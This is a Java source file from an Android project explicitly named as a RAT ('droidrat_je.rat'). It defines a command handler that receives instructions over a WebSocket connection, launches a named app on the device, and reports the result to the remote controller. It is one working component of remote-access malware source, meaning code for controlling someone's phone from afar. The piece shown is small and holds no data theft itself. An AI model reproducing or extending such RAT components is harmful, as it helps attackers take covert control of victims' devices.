package com.je_chen.droidrat_je.rat.command;

import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.appintent.runapp.RunApp;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.droidRatWebSocketClient;

public class RunAppCommand extends CommandFather {

    private final Context context;

    private final RunApp runApp;

    public RunAppCommand(Context context, PackageManager packageManager) {
        this.context = context;
        runApp = new RunApp(packageManager);
    }

    @Override
    public void send(String value) {
        droidRatWebSocketClient.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            String TAG = "Run App Event";
            if ("RunApp".equals(rawCommandArray[1])) {
                String packageName = rawCommandArray[2];
                Log.d(TAG, "Run App :" + packageName);
                runApp.launchApp(context, rawCommandArray[2]);
                this.send("RunApp RunApp " + packageName);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
